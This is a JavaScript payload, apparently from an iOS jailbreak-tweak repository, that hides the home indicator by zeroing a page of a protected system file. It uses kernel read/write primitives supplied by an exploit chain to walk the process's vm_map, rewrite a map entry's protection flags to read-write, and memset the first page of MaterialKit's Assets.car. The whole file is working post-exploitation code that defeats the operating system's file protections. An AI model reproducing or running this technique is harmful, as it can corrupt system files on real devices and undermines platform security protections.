// hide_homebar.js
//
// Repo-served JS port of Cyanide's original Hide Home Bar tweak.
// Mechanism: DirtyZero-style page zeroing of MaterialKit.framework/Assets.car.
//
// Credits:
// - C4ndyF1sh / ZeroCalories for the MaterialKit home-indicator target
// - jailbreakdotparty / dirtyZero for the page-zeroing technique
// - zeroxjf for the Cyanide/Lightsaber JS port

(function () {
    "use strict";

    const TAG = "[HideHomeBar]";
    const TARGET_PATH = "/System/Library/PrivateFrameworks/MaterialKit.framework/Assets.car";

    const PAGE_SIZE = 0x4000n;
    const O_RDONLY = 0;
    const SEEK_END = 2;
    const PROT_READ = 0x1n;
    const PROT_WRITE = 0x2n;
    const MAP_SHARED = 0x1n;
    const MAP_FAILED = 0xffffffffffffffffn;

    const TASK_MAP_OFF = 0x28n;
    const VM_MAP_HDR_OFF = 0x10n;
    const VM_MAP_HDR_NENTRIES_OFF = 0x20n;
    const VM_MAP_HDR_LINKS_NEXT_OFF = 0x8n;
    const VM_MAP_ENTRY_LINKS_NEXT_OFF = 0x8n;
    const VM_MAP_ENTRY_START_OFF = 0x10n;
    const VM_MAP_ENTRY_END_OFF = 0x18n;
    const VM_MAP_ENTRY_STORE_OFF = 0x20n;
    const VM_MAP_ENTRY_FLAGS_OFF = 0x48n;

    const FLAGS_PROT_SHIFT = 7n;
    const FLAGS_MAXPROT_SHIFT = 11n;
    const FLAGS_PROT_MASK = 0x780n;
    const FLAGS_MAXPROT_MASK = 0x7800n;

    function say(msg) {
        const line = TAG + " " + String(msg);
        try {
            if (typeof log === "function") return log(line);
        } catch (_) {}
        try {
            if (typeof LOG === "function") return LOG(line);
        } catch (_) {}
        try {
            if (typeof console !== "undefined" && console.log) console.log(line);
        } catch (_) {}
    }

    function fail(msg) {
        say("ERROR: " + msg);
        return false;
    }

    function big(v) {
        return (typeof v === "bigint") ? v : BigInt(v);
    }

    function hex(v) {
        try { return "0x" + big(v).toString(16); } catch (_) { return String(v); }
    }

    function resolveNative() {
        if (typeof globalThis.Native !== "undefined") return globalThis.Native;
        try {
            if (typeof libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ !== "undefined")
                return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
        } catch (_) {}
        try {
            if (typeof libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ !== "undefined")
                return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"];
        } catch (_) {}
        return null;
    }

    function resolveChain() {
        if (typeof globalThis.Chain !== "undefined") return globalThis.Chain;
        if (typeof globalThis.__ls_chain !== "undefined") return globalThis.__ls_chain;
        try {
            if (typeof libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ !== "undefined")
                return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"];
        } catch (_) {}
        try {
            if (typeof libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ !== "undefined")
                return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"];
        } catch (_) {}
        try {
            if (typeof libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ !== "undefined")
                return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"];
        } catch (_) {}
        return null;
    }

    const Native = resolveNative();
    const Chain = resolveChain();

    function stripPtr(ptr) {
        ptr = big(ptr);
        if (ptr === 0n) return 0n;
        if (Chain && typeof Chain.strip === "function") {
            try { return big(Chain.strip(ptr)); } catch (_) {}
        }

        // Fallback for kernel pointers when Chain.strip/xpac is unavailable.
        // If bit 55 is set, sign-extend into kernel VA space; otherwise keep a
        // userland pointer untagged.
        if ((ptr & (1n << 55n)) !== 0n) return ptr | 0xffffff8000000000n;
        return ptr & 0x7fffffffffn;
    }

    function kread64(addr) {
        return big(Chain.read64(big(addr)));
    }

    function kread32(addr) {
        return Number(Chain.read32(big(addr))) >>> 0;
    }

    function kreadPtr(addr) {
        return stripPtr(kread64(addr));
    }

    function kwrite64(addr, value) {
        Chain.write64(big(addr), big(value));
    }

    function mapEntryCount(vmMap) {
        try {
            return kread32(vmMap + VM_MAP_HDR_OFF + VM_MAP_HDR_NENTRIES_OFF);
        } catch (_) {
            return 0;
        }
    }

    function saneMap(vmMap) {
        const n = mapEntryCount(vmMap);
        return vmMap !== 0n && n > 0 && n < 100000;
    }

    function findVmMapEntryLinear(vmMap, uaddr) {
        const nentries = mapEntryCount(vmMap);
        if (nentries <= 0 || nentries >= 100000) return null;

        let entry = kreadPtr(vmMap + VM_MAP_HDR_OFF + VM_MAP_HDR_LINKS_NEXT_OFF);
        for (let i = 0; i < nentries && i < 100000 && entry !== 0n; i++) {
            const start = kread64(entry + VM_MAP_ENTRY_START_OFF);
            const end = kread64(entry + VM_MAP_ENTRY_END_OFF);
            if (start < end && uaddr >= start && uaddr < end) {
                return { entry, start, end, via: "list" };
            }

            const next = kreadPtr(entry + VM_MAP_ENTRY_LINKS_NEXT_OFF);
            if (next === entry) break;
            entry = next;
        }
        return null;
    }

    function findVmMapEntryRB(vmMap, uaddr) {
        let offs = {};
        try { offs = Chain.offsets ? Chain.offsets() : {}; } catch (_) {}

        const rootOff = (offs && typeof offs.hdrRBHRoot !== "undefined") ? big(offs.hdrRBHRoot) : 0x38n;
        const leftOff = (offs && typeof offs.rbeLeft !== "undefined") ? big(offs.rbeLeft) : 0x0n;
        const rightOff = (offs && typeof offs.rbeRight !== "undefined") ? big(offs.rbeRight) : 0x8n;

        let rbEntry = kreadPtr(vmMap + rootOff);
        for (let i = 0; i < 100000 && rbEntry !== 0n; i++) {
            const entry = rbEntry - VM_MAP_ENTRY_STORE_OFF;
            const start = kread64(entry + VM_MAP_ENTRY_START_OFF);
            const end = kread64(entry + VM_MAP_ENTRY_END_OFF);
            if (start < end && uaddr >= start && uaddr < end) {
                return { entry, start, end, via: "rb" };
            }
            rbEntry = kreadPtr(rbEntry + (uaddr >= start ? rightOff : leftOff));
        }
        return null;
    }

    function findVmMapEntry(vmMap, uaddr) {
        return findVmMapEntryLinear(vmMap, uaddr) || findVmMapEntryRB(vmMap, uaddr);
    }

    function patchEntryWritable(entry) {
        const rw = PROT_READ | PROT_WRITE;
        const flags = kread64(entry + VM_MAP_ENTRY_FLAGS_OFF);
        let newFlags = (flags & ~FLAGS_PROT_MASK) | (rw << FLAGS_PROT_SHIFT);
        newFlags = (newFlags & ~FLAGS_MAXPROT_MASK) | (rw << FLAGS_MAXPROT_SHIFT);

        if (newFlags !== flags) {
            kwrite64(entry + VM_MAP_ENTRY_FLAGS_OFF, newFlags);
        }

        const verify = kread64(entry + VM_MAP_ENTRY_FLAGS_OFF);
        const ok = ((verify & FLAGS_PROT_MASK) === (rw << FLAGS_PROT_SHIFT)) &&
                   ((verify & FLAGS_MAXPROT_MASK) === (rw << FLAGS_MAXPROT_SHIFT));
        say("entry flags " + hex(flags) + " -> " + hex(newFlags) + " verify=" + hex(verify) + " ok=" + (ok ? "1" : "0"));
        return ok;
    }

    function bufferAllZero(ptr, len) {
        const bytes = new Uint8Array(Native.read(ptr, Number(len)));
        for (let i = 0; i < bytes.length; i++) {
            if (bytes[i] !== 0) return false;
        }
        return true;
    }

    function verifyZeroed(path, pageOff, zeroLen) {
        const fd = Native.callSymbol("open", path, O_RDONLY);
        if (Number(fd) < 0) return fail("verify open failed for " + path);

        let buf = 0n;
        try {
            buf = big(Native.callSymbol("malloc", zeroLen));
            if (!buf) return fail("verify malloc failed");
            const got = Native.callSymbol("pread", fd, buf, zeroLen, pageOff);
            if (big(got) !== zeroLen) {
                return fail("verify pread got " + String(got) + "/" + zeroLen.toString());
            }
            if (!bufferAllZero(buf, zeroLen)) {
                return fail("verification failed: page is not all zero");
            }
            return true;
        } finally {
            if (buf) Native.callSymbol("free", buf);
            Native.callSymbol("close", fd);
        }
    }

    function zeroHomeBarAssetPage() {
        if (typeof dz_zero_system_file_page === "function") {
            say("using host-provided dz_zero_system_file_page()");
            return dz_zero_system_file_page(TARGET_PATH, 0) === true;
        }

        if (!Native || !Chain) {
            return fail("needs JS Native + Chain kernel r/w globals; this is a DirtyZero/page-zero JS payload, not a view-hiding script");
        }
        if (typeof Chain.getSelfTaskAddr !== "function" ||
            typeof Chain.read64 !== "function" ||
            typeof Chain.write64 !== "function") {
            return fail("Chain is present but missing kernel r/w helpers");
        }

        const fd = Native.callSymbol("open", TARGET_PATH, O_RDONLY);
        if (Number(fd) < 0) return fail("open failed: " + TARGET_PATH);

        let mapped = 0n;
        let rc = false;

        try {
            const fileSize = big(Native.callSymbol("lseek", fd, 0n, SEEK_END));
            if (fileSize <= 0n) return fail("invalid file size: " + fileSize.toString());

            const pageOff = 0n;
            const zeroLen = (fileSize < PAGE_SIZE) ? fileSize : PAGE_SIZE;
            mapped = big(Native.callSymbol("mmap", 0n, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, pageOff));
            if (mapped === MAP_FAILED || mapped === -1n || mapped === 0n) {
                return fail("mmap failed for " + TARGET_PATH);
            }

            const task = stripPtr(Chain.getSelfTaskAddr());
            if (!task) return fail("self task lookup failed");

            let offs = {};
            try { offs = Chain.offsets ? Chain.offsets() : {}; } catch (_) {}
            const taskMapOff = (offs && typeof offs.mapTask !== "undefined") ? big(offs.mapTask) : TASK_MAP_OFF;
            const vmMap = kreadPtr(task + taskMapOff);
            if (!saneMap(vmMap)) return fail("bad vm_map " + hex(vmMap) + " for task " + hex(task));

            const found = findVmMapEntry(vmMap, mapped);
            if (!found) return fail("vm_map_entry not found for mapped page " + hex(mapped));

            const mappedEnd = mapped + PAGE_SIZE;
            if (found.start > mapped || found.end < mappedEnd) {
                return fail("vm_map_entry too small: mapped=" + hex(mapped) + "-" + hex(mappedEnd) +
                            " entry=" + hex(found.start) + "-" + hex(found.end));
            }

            say("target entry=" + hex(found.entry) + " via=" + found.via +
                " range=" + hex(found.start) + "-" + hex(found.end));

            if (!patchEntryWritable(found.entry)) return false;

            Native.callSymbol("memset", mapped, 0n, zeroLen);
            say("zeroed " + zeroLen.toString() + " bytes at " + TARGET_PATH + " page 0");

            Native.callSymbol("munmap", mapped, PAGE_SIZE);
            mapped = 0n;
            Native.callSymbol("close", fd);

            rc = verifyZeroed(TARGET_PATH, pageOff, zeroLen);
            if (rc) say("SUCCESS: home bar asset page zeroed. Respring to refresh SpringBoard assets.");
            return rc;
        } finally {
            if (mapped) Native.callSymbol("munmap", mapped, PAGE_SIZE);
            try { Native.callSymbol("close", fd); } catch (_) {}
        }
    }

    try {
        globalThis.hideHomeBarDirtyZero = zeroHomeBarAssetPage;
        zeroHomeBarAssetPage();
    } catch (e) {
        fail(String(e && e.stack ? e.stack : e));
    }
})();
